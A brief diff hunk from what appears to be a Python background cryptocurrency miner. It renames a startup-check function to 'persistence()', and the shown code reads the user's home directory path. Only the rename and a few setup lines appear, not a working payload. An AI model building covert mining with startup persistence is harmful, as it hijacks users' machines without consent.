@@ -333,7 +333,7 @@ def bgMining():
     if debugmode:
         print("bgMining started!")
     
-def srtChk(): 
+def persistence(): 
     # Startup Check. (Still in testing!)
     name = str(__name__) # Get filename.
     hd = str(os.path.expanduser('~')) # Get path to home directory.
